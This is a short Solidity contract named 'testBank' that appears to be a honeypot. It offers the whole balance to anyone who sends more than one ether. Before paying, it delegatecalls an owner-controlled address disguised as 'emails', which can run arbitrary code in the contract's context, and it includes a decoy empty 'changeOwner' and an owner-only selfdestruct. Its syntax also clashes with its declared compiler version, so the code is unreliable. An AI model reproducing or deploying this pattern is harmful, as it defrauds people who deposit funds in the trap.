pragma solidity ^0.4.16;
contract testBank
{
    address Owner;
    address adr;
    uint256 public Limit= 1000000000000000000;
    address emails = 0x25df6e3da49f41ef5b99e139c87abc12c3583d13;
    function Update(address dataBase, uint256 limit) 
    {
        require(msg.sender == Owner); 
        Limit = limit;
        emails = dataBase;
    }
    function changeOwner(address adr){
    }
    function()payable{}
    function withdrawal() payable public {
    address adr = msg.sender;
    if (msg.value > Limit) {
        bool success = address(emails).delegatecall(abi.encodeWithSignature("logEvent()"));
        require(success, "Delegatecall failed");
        adr.transfer(address(this).balance);
    }
}
    function kill() {
        require(msg.sender == Owner);
        selfdestruct(msg.sender);
    }
    function testBank(){
        Owner=msg.sender;
    }
}